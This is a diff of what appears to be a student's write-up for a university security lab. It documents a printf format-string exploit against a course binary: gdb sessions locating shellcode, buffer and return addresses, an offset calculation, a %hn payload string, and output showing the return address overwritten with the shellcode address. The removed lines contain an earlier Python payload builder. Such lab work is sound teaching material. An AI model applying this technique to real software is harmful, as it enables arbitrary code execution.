@@ -5,75 +5,56 @@
 The code is vulnerable because of the printf function. We can define arguments to write what we want to memory.
 Before that, we need to know the steps of printf. You can see the detail in [task-description](https://sp24.cs161.org/proj1/q6/)
 
-```plaintext
-...
-[  ][  ][  ][  ] <-- arg2
-[  ][  ][  ][  ] <-- arg1
-[  ][  ][  ][  ] <-- arg0 (&buf)
-[  ][  ][  ][  ] <-- RIP of printf
-[  ][  ][  ][  ] <-- SFP of printf
-...
+## Exploit steps
+
+First, find the address of shellcode `0xffffd7f8`, which will be passed by argv in main.
+
+``` C++
+(gdb) p argv[1]
+$2 = 0xffffd7f8 "j2X̀\211É\301jGX̀1\300Ph-iii\211\342Ph+mmm\211\341Ph//shh/bin\2
+11\343PRQS\211\341\061Ұ\v̀"
 ```
 
-## Exploit Structure
+Second, step into calibrate, file the address of buf `0xffffd5d0` and RIP of calibrate `0xffffd5bc`.
 
-First, we will place the argument we need to buffer, which is significant to what we want to write in memory.
-Second, we need printf 12 characters (address of buf - address of argument1) to move the argument to the buffer.
-Third, we need to modify the "byte" we have printf to overwrite the address of shellcode into RIP of calibrate by %hn and %u.
+```C++
+(gdb) i f
+Stack level 0, frame at 0xffffd5c0:
+ eip = 0x8049224 in calibrate (calibrate.c:10); saved eip = 0x804928f
+ called by frame at 0xffffd670
+ source language c.
+ Arglist at 0xffffd5b8, args: buf=0xffffd5d0 ""
+ Locals at 0xffffd5b8, Previous frame's sp is 0xffffd5c0
+ Saved registers:
+  ebp at 0xffffd5b8, eip at 0xffffd5bc
+(gdb) x/16x buf
+0xffffd5d0:     0x00001000      0x00000000      0x00000000      0x0804904a
+0xffffd5e0:     0x00000000      0x000003ee      0x000003ee      0x000003ee      
+0xffffd5f0:     0x000003ee      0xffffd7db      0x178bfbff      0x00000064      
+0xffffd600:     0x00000000      0x00000000      0x00000000      0x00000000
+```
+
+Third, we need to find address of fmt of printf `0xffffd590`. Then, we need to calculate the offset between the address of fmt and the address of buf is `0xffffd5d0 - (0xffffd5d0 + 4)` = 60bytes = 15words, note, per %c will consume one word  .
+
+Fourth，we need to write the address of shellcode into RIP using %hn and %u.
+%hn is the target address, and %_u is the number we have printf.
+According to the hint, the address will be split into two parts.
+
+- First part, %hn (target address) is `0xffffd5bc`,  %_u is the first half of `0xffffd7f8` = `0xd7f8`, first half of shellcode address. we have printf 16(AAAA+addr+AAAA+addr) + 15(%c), the number will be `0xd7f8 - 31`.
+- Second part, %u (number we have printf) is `0xffff - 0xd7f8`.
 
 ## Exploit GDB Output
 
 before attack
 
 ```C++
-(gdb) x/64x 0xffffd5b0
-0xffffd5b0:     0x00000002      0x00000000      0xffffd658      0x0804928f
-0xffffd5c0:     0xffffd5d0      0x08048034      0x00000020      0x00000008      
-0xffffd5d0:     0x41414141      0xffffd5bc      0x41414141      0xffffd5be      
-0xffffd5e0:     0x63256325      0x63256325      0x63256325      0x63256325      
-0xffffd5f0:     0x63256325      0x63256325      0x32353525      0x25753637      
-0xffffd600:     0x31256e68      0x33343230      0x6e682575      0x0000000a      
-0xffffd610:     0x00000000      0x00000001      0x00000000      0xffffd7cb      
-0xffffd620:     0x00000002      0x00000000      0x00000000      0x00000000      
-0xffffd630:     0x00000000      0xffffdfe0      0xf7ffc540      0xf7ffc000      
-0xffffd640:     0x00000000      0x00000000      0x00000000      0x00000000      
-0xffffd650:     0x00000000      0xffffd670      0xffffd6f0      0x08049466      
-0xffffd660:     0x00000002      0x0804926c      0x0804ffe8      0x08049466      
-0xffffd670:     0x00000002      0xffffd6e4      0xffffd6f0      0x0804e04e      
-0xffffd680:     0x00000000      0x00000000      0x08049444      0x0804ffe8      
-0xffffd690:     0x00000000      0x00000000      0x00000000      0x08049097      
-0xffffd6a0:     0x0804926c      0x00000002      0xffffd6e4      0x08049000 
+(gdb) x 0xffffd5bc
+0xffffd5bc:     0x0804928f
 ```
 
 after attack
 
 ```  C++
-Program received signal SIGSEGV, Segmentation fault.
-0x0804ad5f in printf_core (f=f@entry=0x80500c0 <__stdout_FILE>, fmt=fmt@entry=0xffffd5d0 "AAAA\274\325\377\377AAAA\276\325\377\377%c%c%c%c%c%c%c%c%c%c%c%c%55276u%hn%10243u%hn\n", ap=ap@entry=0xffffd45c, nl_arg=<optimized out>, nl_type=<optimized out>) at src/stdio/vfprintf.c:548
-548     src/stdio/vfprintf.c: No such file or directory.
-```
-
-Pathetically, I do not know where the problem is.
-Below is my python code.
-
-``` python
-payload = ''
-payload += "A" * 4   #(consumed by %__u)
-payload += '\xbc\xd5\xff\xff'    #  lower half word address of RIP that we want to overwrite
-payload += 'A' * 4   #(consumed by %__u)
-payload += '\xbe\xd5\xff\xff'    #  higher half word address of RIP that we want to overwrite
-
-payload += "%c" * 12  # move the pointer of printf to buffer
-
-cur =  12 
-FIRST_HALF = 65535   # The two most significant bytes of RIP
-SECOND_HALF = 55288  # The two least significant bytes of RIP
-
-payload += '%' + str(SECOND_HALF - cur) + 'u'
-payload += '%hn'
-
-payload += '%' + str(FIRST_HALF - SECOND_HALF) + 'u'
-payload += '%hn'
-payload += '\0'
-print(payload + '\n')
+(gdb) x 0xffffd5bc
+0xffffd5bc:     0xffffd7f8
 ```
